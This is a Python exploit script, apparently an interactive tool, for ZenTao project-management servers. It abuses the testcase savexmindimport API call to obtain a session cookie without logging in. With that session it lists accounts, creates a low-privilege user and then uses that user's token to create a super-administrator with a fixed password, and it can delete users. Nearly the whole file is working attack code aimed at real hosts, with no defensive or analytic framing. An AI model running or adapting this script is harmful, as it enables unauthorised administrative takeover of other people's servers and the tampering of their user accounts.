import requests
import random
import json
import string

UA = "flower Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 flower/majyo-party"

headers = {
    "User-Agent": UA,
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    }

def generate_random_string(length):
    characters = string.ascii_letters
    return ''.join(random.choice(characters) for _ in range(length))

def Req(iu,headers,cookies=None):
    if cookies:
        try:
            try:
                response = requests.get("http://"+iu, headers=headers,  verify=False, allow_redirects=True,cookies=cookies,timeout=2)
                return response.text
            except requests.exceptions.SSLError as e:
                response = requests.get("https://" + iu, headers=headers,  verify=False, allow_redirects=True,cookies=cookies,timeout=2)
                return response.text
        except (requests.exceptions.ConnectTimeout , requests.exceptions.ConnectionError) as e:
            print("Connection timed out or host Failed")
            exit(1)
    else:
        try:
            try:
                response = requests.get("http://"+iu, headers=headers,  verify=False, allow_redirects=True,timeout=2)
                return response.headers
            except requests.exceptions.SSLError as e:
                response = requests.get("https://" + iu, headers=headers,  verify=False, allow_redirects=True,timeout=2)
                return response.headers
        except  (requests.exceptions.ConnectTimeout , requests.exceptions.ConnectionError) as e:
            print("Connection timed out or host Failed")
            exit(1)

def getzentaosid(host):
    randstr0=generate_random_string(20)
    randstr1=generate_random_string(20)
    iu=f"{host}/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID={randstr0}&branch={randstr1}"
    req=Req(iu,headers)
    return req["Set-Cookie"].split(";")[0]

def auth_req(host,id=None):
    sid = getzentaosid(host).split("=")[1]
    cookies = {'zentaosid': f'{sid}', 'zentaosid': f'{sid}', 'lang': 'zh-cn', 'device': 'desktop', 'theme': 'purple'}
    req = Req(host + f"/api.php/v1/users/{id or 1}", headers, cookies=cookies)
    return req

def auth_post(host,data,sid=None,otherurl=None):
    if sid == None:
        sid = getzentaosid(host).split("=")[1]
    cookies = sid if sid == False else {'zentaosid': f'{sid}', 'zentaosid': f'{sid}', 'lang': 'zh-cn', 'device': 'desktop', 'theme': 'purple'}
    url = otherurl if otherurl is not None else '/api.php/v1/users'
    try:
        response = requests.post("http://" + host + url ,cookies=cookies,json=data,headers=headers, verify=False, allow_redirects=True, timeout=2)
        creatFT(response.status_code)
        return response.text
    except requests.exceptions.SSLError as e:
        response = requests.post("https://" + host + url,cookies=cookies,json=data, headers=headers, verify=False, allow_redirects=True, timeout=2)
        creatFT(response.status_code)
        return response.text

def auth_delete(host,id,sid):
    cookies = {'zentaosid': f'{sid}', 'zentaosid': f'{sid}', 'lang': 'zh-cn', 'device': 'desktop', 'theme': 'purple'}
    try:
        response = requests.delete("http://" + host + f"/api.php/v1/users/{id}",cookies=cookies,headers=headers, verify=False, allow_redirects=True, timeout=2)
        print(response.status_code)
        return response.text
    except requests.exceptions.SSLError as e:
        response = requests.delete("https://" + host + f"/api.php/v1/users/{id}",cookies=cookies, headers=headers, verify=False, allow_redirects=True, timeout=2)
        return response.text

def creatFT(status):
    if status == 403 :
        print("username:usertest1 password:Passwd@1")

def CreateUser(host,id=None):
    lowerUsername = "tttbxc1xtt"
    data1 = {"account": lowerUsername,
            "password": "Passwd@1",
            "realname": "test1",
            "role": "top",
            "group": '1',
            "commiter": "",
            "company": "",
            "dept": "2",
            "passwordStrength": "1",
            "gender": "m",
            "visions": ["rnd"],
            "type": "inside",
            "join": "2023-12-07"
            }
    if id == None:
        create_msg = auth_post(host, data1)
        return create_msg
    elif id.isdigit():
        data2={"account":lowerUsername,"password":"Passwd@1"}
        getUsersid = auth_post(host,data2,otherurl="/api.php/v1/tokens")
        sid=json.loads(getUsersid)["token"]
        print("----lower_token----")
        print(sid)
        print("-------------------")
        data1["account"] = "usertest" + id #high priv username
        createHighUser = auth_post(host,data1,sid=sid)
        print(json.loads(createHighUser))
        return createHighUser
def start(host):
    if auth_req(host):
        erabi=input("❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀\n"
                    "❀v1.1已知问题                                                         \t❀\n"    
                    "❀1.测试用的18.11版本创建完初始用户后需要再运行一次2创建 即可创建超管          \t❀\n"
                    "❀2.删除用户根据目标存在不稳定性 调用api可能会删不掉 可以创建超管进web删除       \t❀\n"
                    "❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀❀\n"
                    "1.user list\n"
                     "2.create user\n"
                     "3.delete user\n"
                     "❀Number❀:")
        id = "394" #high priv username last id
        if erabi == '2':
            # 1.create low priv user
            CreateLowuser=CreateUser(host)
            print(json.loads(CreateLowuser))
            flag=input("❀lower priv user Created❀\n"
                       "❀Create higth user❀ ?\n"
                       "❀y/n❀: ")
            if flag.lower() != "y":
                print("[*]exit")
                exit(1)
            # 2.use low priv user sid Create high priv user
            CreateHighuser = CreateUser(host,id=id)
            jsFormat = json.loads(CreateHighuser)

            print("❀❀❀❀❀❀❀❀❀❀❀\n"
                  "❀ high priv User created ❀\n"
                  "user id:",jsFormat['id'],"\n"
                  "user name:",jsFormat['account'],"\n"
                  "password:Passwd@1\n"
                  "❀❀❀❀❀❀❀❀❀❀❀")
            if jsFormat['group']['1']['role'] == "admin":
                pass
        elif erabi == '1':
            userlist = []
            try:
                for i in range(1,50):
                    list=json.loads(auth_req(host, i))
                    print(list)
                    userlist.append(list)
            except json.decoder.JSONDecodeError as e:
                print("-----------")
                testid=[ user["id"] for user in userlist if user["account"] == 'usertest']
                print("[*]##testuser id is "+ str(testid[0]))
                print("❀[*]bye~❀")
                exit(1)

        elif erabi == '3':
            delete_id=str(input("want to delete ID \n"
                  "id or PRESS ANY KEY TO EXIT: "))
            if delete_id.isdigit():
                data = {"account": f"usertest{id}", "password": "Passwd@1"}
                getUsersid = auth_post(host, data, otherurl="/api.php/v1/tokens",sid=False)
                sid=json.loads(getUsersid)["token"]
                print("[*]use high user token:"+sid)
                delete_msg = auth_delete(host, delete_id, sid)
                print(json.loads(delete_msg))
            else:
                print("❀[*]bye~❀")
            exit(1)


if __name__=='__main__':
    host=input("Script by ❀Flower"
               "input host:port\n"
               "❀example❀: text.com:888 or 10.10.10.10\n"
               "host:")
    flag = auth_req(host)
    print(flag)
    try:
        if json.loads(flag)["id"] == 1:
            print("❀-----VULN------❀")
            start(host)
    except Exception as e:
        print("❀----over----❀")
